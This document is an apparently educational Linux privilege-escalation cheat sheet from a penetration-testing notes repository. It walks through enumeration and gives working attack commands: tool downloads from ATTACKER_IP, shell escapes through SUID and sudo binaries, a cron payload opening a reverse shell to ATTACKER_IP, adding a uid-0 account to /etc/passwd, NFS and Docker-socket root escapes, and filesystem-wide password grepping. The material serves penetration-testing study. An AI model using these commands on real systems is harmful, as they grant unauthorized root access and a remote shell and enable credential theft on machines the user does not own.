# 06 – Linux Privilege Escalation

## Philosophy

Gaining an initial foothold on a Linux machine rarely grants administrative privileges. Most compromises start with a **low-privilege shell**, and the attacker must escalate privileges to **root** to fully control the system.

Linux privilege escalation focuses on identifying **misconfigurations, vulnerable services, weak permissions, or kernel flaws** that allow a normal user to execute commands with elevated privileges.

Successful escalation relies on **systematic enumeration**, identifying weaknesses, and exploiting them.

---

# Attack Surface Overview

Common Linux privilege escalation vectors:

| Vector                 | Description                                         |
| ---------------------- | --------------------------------------------------- |
| Kernel Exploits        | Outdated kernels vulnerable to public exploits      |
| Sudo Misconfigurations | Commands executable as root                         |
| SUID/SGID Binaries     | Programs running with elevated privileges           |
| Linux Capabilities     | Fine-grained privilege assignments                  |
| Cron Jobs              | Scheduled root tasks that may run writable scripts  |
| Writable Files         | Configs, scripts, or libraries writable by user     |
| PATH Hijacking         | Executing malicious binaries before legitimate ones |
| Environment Variables  | Abuse of `LD_PRELOAD`, `LD_LIBRARY_PATH`            |
| NFS Shares             | Misconfigured exports such as `no_root_squash`      |
| Containers             | Escaping Docker or LXC environments                 |
| Credentials            | Passwords stored in configs or logs                 |

---

# Linux Privilege Escalation Workflow

```
┌─────────────────────────────────────────────────────────┐
│              Initial Enumeration                          │
│  whoami | id | uname -a | sudo -l                        │
│  cat /etc/passwd | ps aux                                │
└──────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│              Automated Enumeration                        │
│  LinPEAS | LinEnum | linux-smart-enumeration             │
└──────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│              Manual Deep Enumeration                      │
│  SUID | cron jobs | writable files | capabilities        │
└──────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│              Exploit Identification                       │
│  searchsploit | GTFOBins | kernel exploits               │
└──────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│              Exploit Execution                            │
│  Execute exploit or misconfiguration abuse               │
│  → obtain root shell                                     │
└──────────────────────────────────────────────────────────┘
```

---

# Command Arsenal

## Initial Enumeration

### System Information

```bash
uname -a
cat /etc/os-release
hostnamectl
cat /proc/version
```

### User Information

```bash
whoami
id
sudo -l

cat /etc/passwd | grep -v nologin
cat /etc/group
```

### Network Enumeration

```bash
ip a
netstat -tulpn
ss -tulpn

cat /etc/hosts
arp -a
```

### Process Enumeration

```bash
ps auxf
ps aux | grep root
top -n 1
```

---

# Filesystem Enumeration

### Check Sensitive Directories

```bash
ls -la /root/ 2>/dev/null
ls -la /home/
ls -la /tmp /var/tmp /dev/shm
```

### SUID / SGID Binaries

```bash
find / -type f -perm -4000 2>/dev/null
find / -type f -perm -2000 2>/dev/null
```

### Writable Files and Directories

```bash
find / -type f -perm -2 2>/dev/null
find / -writable -type d 2>/dev/null
```

---

# Cron Job Enumeration

```bash
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*
grep CRON /var/log/syslog
```

Look for:

* scripts executed as **root**
* scripts **writable by current user**

---

# Automated Enumeration

Automation tools dramatically accelerate privilege escalation discovery.

---

## LinPEAS (Primary Tool)

LinPEAS is the **most widely used Linux privilege escalation enumeration script**.

### Transfer LinPEAS

```bash
wget http://ATTACKER_IP/linpeas.sh
chmod +x linpeas.sh
```

### Execute

```bash
./linpeas.sh
```

### Save Results

```bash
./linpeas.sh -a > linpeas_output.txt
```

LinPEAS highlights:

* SUID binaries
* weak sudo permissions
* writable files
* credentials in configs
* vulnerable kernel versions
* PATH hijacking opportunities

---

## LinEnum

```bash
wget http://ATTACKER_IP/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -r report -e /tmp/
```

---

## Linux Smart Enumeration

```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh

./lse.sh -l 1
```

---

# SUID Exploitation

SUID binaries execute with the permissions of the **file owner**.

Find them:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Common exploitable binaries include:

```
find
vim
nmap
less
more
man
cp
mv
```

Example:

```bash
find . -exec /bin/sh \; -quit
```

Older `nmap` versions:

```bash
nmap --interactive
!sh
```

---

# Sudo Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

If a program can run as root, check **GTFOBins**.

Example with `vi`:

```bash
sudo vi /etc/sudoers
:!/bin/sh
```

Example with `less`:

```bash
sudo less /etc/profile
!sh
```

---

# Kernel Exploits

Identify kernel version:

```bash
uname -r
```

Search for public exploits:

```bash
searchsploit linux kernel 5.4
```

Compile and execute exploit:

```bash
gcc exploit.c -o exploit
./exploit
```

---

# Writable Cron Jobs

Check scheduled tasks:

```bash
cat /etc/crontab
```

If the script is writable:

```bash
echo '#!/bin/bash' > script.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> script.sh
```

---

# Writable `/etc/passwd`

If writable:

```bash
openssl passwd -1 password
```

Add root user:

```bash
echo "hacker:$1$hash:0:0:root:/root:/bin/bash" >> /etc/passwd
```

Switch user:

```bash
su hacker
```

---

# Linux Capabilities

Capabilities provide privileges without full root access.

Check capabilities:

```bash
getcap -r / 2>/dev/null
```

Example:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

---

# NFS No Root Squash

Check exports:

```bash
cat /etc/exports
```

If `no_root_squash` exists:

Mount share:

```bash
mount -t nfs TARGET:/share /mnt
```

Copy SUID binary:

```bash
cp /bin/bash /mnt/bash
chmod +s /mnt/bash
```

Run on target:

```bash
/tmp/bash -p
```

---

# Docker Escape

Check if inside container:

```bash
find / -name .dockerenv
```

If docker socket available:

```bash
docker run -v /:/hostOS -it alpine chroot /hostOS /bin/sh
```

---

# Process Monitoring (pspy)

`pspy` detects processes without root privileges.

```bash
./pspy64
```

Useful for detecting:

* cron jobs
* automated scripts
* privileged executions

---

# Credential Hunting

Search configuration files:

```bash
grep -ri password / 2>/dev/null
grep -ri pass /home 2>/dev/null
grep -r DB_PASSWORD /var/www/ 2>/dev/null
```

Common locations:

```
/var/www/
/home/
/etc/
/opt/
```

---

# Attack Path Prioritization

Typical escalation order:

1. **sudo -l**
2. **SUID binaries**
3. **LinPEAS findings**
4. **cron jobs**
5. **capabilities**
6. **kernel exploits**
7. **docker escape**
8. **NFS misconfiguration**

---

# Common Mistakes

### Not Running LinPEAS

Automated tools detect many hidden misconfigurations.

### Ignoring Simple Misconfigurations

Many root shells come from simple mistakes like:

```
sudo vi
```

### Blind Kernel Exploits

Verify:

* kernel version
* architecture
* exploit reliability

---

# Professional Tips

### Use LinPEAS First

It often reveals **multiple escalation paths immediately**.

### Use pspy for Cron Discovery

Short-interval cron jobs can be missed manually.

### Check Writable Shared Libraries

```
ldd /bin/ls
```

### Always Test Direct Root Shell

```bash
sudo /bin/bash
```

Sometimes it simply works.

---

# Output Organization

```
06-Linux-Privilege-Escalation
│
├── README.md
│
├── hosts
│   ├── 192.168.1.10
│   │   ├── linpeas.out
│   │   ├── suid.txt
│   │   ├── kernel_exploits.txt
│   │   ├── pspy.log
│   │   └── notes.md
│
├── exploits
│   ├── dirtycow.c
│   ├── overlayfs.c
│
└── tools
    ├── linpeas.sh
    ├── pspy64
    └── lse.sh
```
